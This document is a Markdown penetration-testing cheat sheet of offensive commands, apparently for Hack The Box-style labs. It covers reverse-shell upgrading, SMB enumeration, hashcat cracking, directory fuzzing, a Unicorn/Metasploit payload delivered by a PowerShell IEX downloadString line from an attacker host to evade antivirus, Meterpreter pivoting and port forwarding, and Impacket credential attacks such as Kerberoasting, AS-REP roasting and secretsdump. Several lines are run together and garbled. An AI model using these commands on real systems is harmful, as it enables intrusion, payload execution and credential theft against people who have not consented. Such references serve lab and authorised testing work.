## Header
## [A Real Reverse shell        ](#get-a-real-shell-from-a-reverse-shell)| [SMB Enumeration     ](#smb-enumeration-with-smbmap-and-smbclient)| [Password Cracking       ](#password-hash-identification) | [Directory finding           ](#discovery) | [Unicorn        ](#unicorn) | [LDAPSearch       ](#ldapsearch) | [DNS transfer          ](#dns-transfer) | [Pivoting with Autoroute     ](#pivoting-with-autoroute) | [Port forward             ](#port-forward) | [RDP         ](#rdp) | [Impacket           ](#impacket) | [Defualt web Login         ](#defualt-web-login)

## Get a real shell from a reverse shell
```
After exploiting a web vulnerability you have successfully opened a reverse shell which is difficult to move forward because there is no autocompletion and no history.
```

### rlwrap
```
rlwrap nc -lvnp 4444
```
### Use Python
Execute this on the remote machine:
```
python -c 'import pty; pty.spawn("/bin/bash")'Ctrl+Z      # or python3 -c 'import pty; pty.spawn("/bin/bash")'Ctrl+Z
```
Now in your kali execute the following:
```
stty -a       # or stty rows <num> columns <cols>
stty raw -echo
fg
```
Back in your reverse shell do:
```
reset
export SHELL=bash
export TERM=xterm-256color
```
[Header](#header)


## SMB Enumeration with smbmap and smbclient

### smbmap
#### Basic Usage of smbmap
```
smbmap -H <10.10.10.10>
```
#### With anonymous login
```
smbmap -H <10.10.10.10> -u anonymous -p anonymous
```
#### List all file Recursively : add -R option
```
smbmap -R <IPC$> -H <10.10.10.10>
```
#### Then auto download a file according to a pattern while listing:
```
smbmap -R <IPC$> -H <10.10.10.10> -A <Groups.xml> -q
```
#### Downloaded files should be in ```/usr/share/smbmap/<10.10.10.10...>```

### smbclient
#### Basic usage of smbclient

#### Just list shares without prompt:
```
smbclient -L \\10.10.10.10
smbclient -L \\\\10.10.10.10\\Share
```
#### Enter in interactive mode:
```
smbclient \\10.10.10.10
smbclient \\10.10.10.10\\Share
```
#### Add user right:
```
smbclient \\10.10.10.10 -U user
smbclient \\\\10.10.10.10\\Share -U user
```
```
The "-U" option have to be set at the end.
If you have : Not enough '\' characters in service
Then verify that you have at least 2 backslash with just the IP address and 4 with the share.
```
[Header](#header)
## Password hash identification
```
git clone https://github.com/SmeegeSec/HashTag.git
python HashTag.py -hc -sh $1$MtCReiOj$zvOdxVzPtrQ.PXNW3hTHI0
```

## Hashcat
```
hashcat --example-hashes | less
hashcat -a 0 -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 1800 hash.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```
```
-a :: attack mode -m ::hash type -r rule file
attack   # | Mode
        ===+======
         0 | Dictionnary (Straight)
         1 | Combination
         3 | Brute-force
rules :  /usr/share/hashcat/rules/
```
```
cisco password cracking :: https://www.infosecmatter.com/cisco-password-cracking-and-decrypting-guide/)
```
[Header](#header)
## Discovery

#### Gobuster
```
gobuster -h
gobuster dir[|vhost] -u http://example.com/ -w rockyou.txt -x php,text -t 50
```

Note :: if gobuster return 200 ok  for all the dictionnary you can use wfuzz

```
wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.10/FUZZ | tee wfuzz.log
```
Then hide result with the appropiate option:
```
--hc/hl/hw/hh N[,N]    +Hide responses with the specified code/lines/words/chars
```
##### Wfuzz for listing of subdomains
```
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -u website.com -H "Host: FUZZ.website.com" --hw 123
```
[Header](#header)

## Unicorn
```
/opt/unicorn/unicorn.py windows/meterpreter/reverse_tcp 10.10.10.26 4545
```
```
This generate 2 files:
    - powershell_attack.txt (which is the payload encrypted to bypass AV)
    - unicorn.rc
```
Just call metasploit with -r option
```
msfconsole -r unicorn.rc
```
And on the remote machine:
```
IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/powershell_attack.txt')
```
```
Note :: If you execute the above line in powershell you will need to remove the powershell command from powershell_attack.txt
```
```
At this point you should get a meterpreter shell
```
[Header](#header)
## ldapsearch

```
ldapsearch -x -h 10.10.10.10
ldapsearch -x -h 10.10.10.10 -s base
ldapsearch -x -h 10.10.10.10 -s base namingcontexts
ldapsearch -x -h 10.99.99.99 -s sub -b 'dc=hackthebox,dc=htb'
nmap -p 389 --script ldap-rootdse -Pn 10.10.10.10nmap -p 389 --script ldap-search -Pn 10.10.10.10
```
[Header](#header)
## DNS transfer
```
nslookup
> server 10.10.10.13
> 10.10.10.13
13.10.10.10.in-addr.arpa	name = ns1.cronos.htb.>

dig axfr @10.10.10.13 cronos.htb
```
[Header](#header)
## Pivoting with Autoroute 
```
meterpreter > run autoroute -s 192.168.0.0/24
[*] Adding a route to 192.168.0.0/255.255.255.0...
[+] Added route to 192.168.0.0/255.255.255.0 via 192.168.0.1
[*] Use the -p option to list all active routes
meterpreter > run autoroute -p
Active Routing Table
====================
Subnet Netmask Gateway
------ ------- -------
192.168.0.0 255.255.255.0 Session 1
msf auxiliary(tcp) > use auxiliary/server/socks4a
msf auxiliary(socks4a) > run
[*] Starting the socks4a proxy server
```
```
netstat -eltn
tcp 0 0 0.0.0.0:1080 0.0.0.0:* LISTEN 0 24406
```
```
vim /etc/proxychains.conf
socks4 127.0.0.1 1080
```
```
proxychains nmap -p 445 -sV -sT -n 192.168.0.2 -Pn
```
[Header](#header)
## Port forward
```
meterpreter > portfwd add -L 0.0.0.0 -l 445 -r 192.168.57.102 -p 445
[*] Local TCP relay created: 
0.0.0.0:445 <-> 192.168.57.102:445
meterpreter > portfwd list
Active Port Forwards
=================`===
Index Local Remote Direction
----- ----- ------ ---------
1 0.0.0.0:445 192.168.57.102:445 Forward1 total active port forwards
```
[Header](#header)
## RDP
#### RDesktop
```
rdesktop -g 80% 10.10.10.10
rdesktop -g 80% -u USER -p 'PASS' 10.10.10.10rdesktop -g 80% -u DOMAIN\\USER -p 'PASS' 
    10.10.10.10rdesktop -g 80% -u USER -p 'PASS' -r disk:tmp=/root/share 10.10.10.10
```
#### xfreerdp
```
xfreerdp connection.rdp /p:Pwd123! /fxfreerdp /u:CONTOSO\JohnDoe /p:Pwd123! /v:rdp.contoso.com
xfreerdp /u:JohnDoe /p:Pwd123! /w:1366 /h:768 /v:192.168.1.100:4489xfreerdp /u:JohnDoe /p:Pwd123! /vmconnect:C824F53E-95D2-46C6-9A18-23A5BB403532 /v:192.168.1.100
xfreerdp --plugin rdpsnd --plugin rdpdr --data disk:home:/home -- -u administrator 10.1.1.2 
\\tsclient\home
```
[Header](#header)
## Impacket

[beginner impacket info](#https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
#### SMB Server
```
impacket-smbserver -smb2support files `pwd`
```
#### GetADUSer
```
GetADUsers.py -all dom.ain/user -dc-ip 10.10.10.10
```
#### GetUserSPNs
```
GetUserSPN.py -request -dc-ip 10.10.10.10 domain/user
GetUserSPNs.py domain/user -dc-ip 10.10.10.10
```
#### AS-REP Roast
```
GetNPUsers.py domain.name/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```
#### mssqlclient
```
mssqlclient.py htb.local/user@10.10.10.10
```
#### lookupsid
```
lookupsid.py  "user:pass@10.10.10.10"
```
#### ridenum
```
ridenum.py 10.10.10.10 500 50000
```
#### secretsdump
```
secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
secretsdump.py -ntds ntds.dit -system system.save LOCAL -outputfile hash
```
[Header](#header)
## Defualt web Login
```
https://github.com/InfosecMatter/default-http-login-hunter
```
```
https://cirt.net/passwords
https://www.routerpasswords.com/
```
[Header](#header)






























